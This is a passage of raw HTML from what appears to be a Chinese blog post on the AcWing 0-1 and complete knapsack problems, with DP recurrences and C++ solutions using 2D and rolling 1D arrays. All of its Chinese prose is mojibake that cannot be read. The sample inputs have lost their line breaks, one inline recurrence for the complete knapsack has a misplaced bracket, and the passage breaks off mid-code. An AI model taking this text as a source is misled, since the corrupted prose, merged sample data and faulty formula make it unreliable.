style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>æ±‚è§£å°†å“ªäº›ç‰©å“è£…å…¥èƒŒåŒ…ï¼Œå¯ä½¿è¿™äº›ç‰©å“çš„æ€»ä½“ç§¯ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡ï¼Œä¸”æ€»ä»·å€¼æœ€å¤§ã€‚<br>è¾“å‡ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•°ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>ï¼Œ</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">Nï¼ŒV</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç‰©å“æ•°é‡å’ŒèƒŒåŒ…å®¹ç§¯ã€‚</p><p>æ¥ä¸‹æ¥æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> è¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i, w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ä»¶ç‰©å“çš„ä½“ç§¯å’Œä»·å€¼ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0\lt v_i, w_i \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹</strong></p><pre><code>4 51 22 43 44 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>8</code></pre><h3 id="äºŒç»´dpæ•°ç»„">äºŒç»´dpæ•°ç»„</h3><ul><li>çŠ¶æ€è®¡ç®— <code>f[i][j] = max(f[i - 1][j], f[i- 1][j - v[i]] + w[i])</code><ul><li>ä»¥æ˜¯å¦åŒ…å«ç‰©å“iè¿›è¡Œåˆ†ç±»</li><li>ä¸å«i <code>f[i - 1][j]</code></li><li>å«i <code>f[i- 1][j - v[i]] + w[i]</code></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span>  <span class="comment">// max()éœ€è¦</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], &amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">      <span class="keyword">if</span> (j &gt;= v[i]) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j - v[i]] + w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»£ç å±‚ä¼˜åŒ–ï¼šä¸€ç»´dpæ•°ç»„">ä»£ç å±‚ä¼˜åŒ–ï¼šä¸€ç»´dpæ•°ç»„</h3><blockquote><p>DPçš„ä¼˜åŒ–å¾ˆå¤šæ˜¯åœ¨ä»£ç å±‚é¢çš„ï¼Œè€Œéç®—æ³•å±‚é¢ã€‚</p></blockquote><p><code>f[i][j] = max(f[i - 1][j], f[i - 1][j - v[i]] + w[i])</code> è®¡ç®—æ—¶åªç”¨åˆ°äº†ä¸Šä¸€å±‚çš„ä¿¡æ¯ï¼Œå¯ç”¨<strong>æ»šåŠ¨æ•°ç»„</strong>ä¼˜åŒ–ã€‚</p><p>ç”±äº<code>f[i - 1][j - v[i]]</code>ä½¿ç”¨åˆ°çš„æ˜¯<code>i - 1</code>å±‚ä¿¡æ¯ï¼Œæ‰€ä»¥<mark>ä½“ç§¯å¿…é¡»ä»å¤§åˆ°å°éå†</mark>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], &amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= v[i]; j--) &#123;  <span class="comment">// ä¸è¦åˆ°0</span></span><br><span class="line">      f[j] = <span class="built_in">max</span>(f[j], f[j - v[i]] + w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AcWing-3-å®Œå…¨èƒŒåŒ…é—®é¢˜"><a href="https://www.acwing.com/problem/content/3/">AcWing 3. å®Œå…¨èƒŒåŒ…é—®é¢˜</a></h2><p><code>éš¾åº¦ï¼šç®€å•</code></p><p>æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> ç§ç‰©å“å’Œä¸€ä¸ªå®¹é‡æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> çš„èƒŒåŒ…ï¼Œæ¯ç§ç‰©å“éƒ½æœ‰æ— é™ä»¶å¯ç”¨ã€‚</p><p>ç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ç§ç‰©å“çš„ä½“ç§¯æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œä»·å€¼æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚</p><p>æ±‚è§£å°†å“ªäº›ç‰©å“è£…å…¥èƒŒåŒ…ï¼Œå¯ä½¿è¿™äº›ç‰©å“çš„æ€»ä½“ç§¯ä¸è¶…è¿‡èƒŒåŒ…å®¹é‡ï¼Œä¸”æ€»ä»·å€¼æœ€å¤§ã€‚<br>è¾“å‡ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>è¾“å…¥æ ¼å¼</strong></p><p>ç¬¬ä¸€è¡Œä¸¤ä¸ªæ•´æ•°ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mtext>ï¼Œ</mtext><mi>V</mi></mrow><annotation encoding="application/x-tex">Nï¼ŒV</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mord cjk_fallback">ï¼Œ</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç‰©å“ç§æ•°å’ŒèƒŒåŒ…å®¹ç§¯ã€‚</p><p>æ¥ä¸‹æ¥æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> è¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_i, w_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼Œåˆ†åˆ«è¡¨ç¤ºç¬¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> ç§ç‰©å“çš„ä½“ç§¯å’Œä»·å€¼ã€‚</p><p><strong>è¾“å‡ºæ ¼å¼</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæœ€å¤§ä»·å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><mi>N</mi><mo separator="true">,</mo><mi>V</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \lt N, V \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span><br><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn><mo>&lt;</mo><msub><mi>v</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>w</mi><mi>i</mi></msub><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">0 \lt v_i, w_i \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>è¾“å…¥æ ·ä¾‹</strong></p><pre><code>4 51 22 43 44 5</code></pre><p><strong>è¾“å‡ºæ ·ä¾‹ï¼š</strong></p><pre><code>10</code></pre><h3 id="äºŒç»´dpæ•°ç»„-2">äºŒç»´dpæ•°ç»„</h3><ul><li><p>çŠ¶æ€è®¡ç®— <code>f[i][j] = max(f[i - 1][j], f[i][j - v[i] + w[i]) </code></p><ul><li><p>æŒ‰ç…§ç‰©å“ié€‰æ‹©å¤šæ¬¡è¿›è¡Œåˆ†ç±»</p></li><li><p>ç‰©å“ié€‰kæ¬¡ <code>f[i - 1][j - k*v[i]] + k*w[i], k = 0,1,.. </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç”±äº</span><br><span class="line">f[i][j] = max(f[i-1][j], f[i-1][j-v]+w, f[i-1][j-2v]+2w, ...)</span><br><span class="line">f[i][j-v] = max(         f[i-1][j-v],   f[i-1][j-2v]+2w, ...)</span><br><span class="line">æ‰€ä»¥ f[i][j] = max(f[i-1][j], f[i][j-v] + w) </span><br><span class="line">ï¼ä¸0-1èƒŒåŒ…é—®é¢˜ä¸åŒçš„æ˜¯ f[i-1][j-v]å’Œf[i][j-v]</span><br></pre></td></tr></table></figure></li></ul></li></ul><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN][kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], &amp;w[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= m; j++) &#123;</span><br><span class="line">      f[i][j] = f[i - <span class="number">1</span>][j];</span><br><span class="line">      <span class="keyword">if</span> (j &gt;= v[i]) &#123;</span><br><span class="line">        f[i][j] = <span class="built_in">max</span>(f[i][j], f[i][j - v[i]] + w[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f[n][m]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¸€ç»´åº¦dpæ•°ç»„">ä¸€ç»´åº¦dpæ•°ç»„</h3><p>ç”±äº<code>f[i][j - v[i]]</code>ä½¿ç”¨åˆ°çš„æ˜¯<code>i </code>å±‚ä¿¡æ¯ï¼Œæ‰€ä»¥<mark>ä½“ç§¯å¿…é¡»ä»å°åˆ°å¤§éå†</mark>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> kN = <span class="number">1010</span>;</span><br><span class="line"><span class="type">int</span> n, m, v[kN], w[kN];</span><br><span class="line"><span class="type">int</span> f[kN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;v[i], 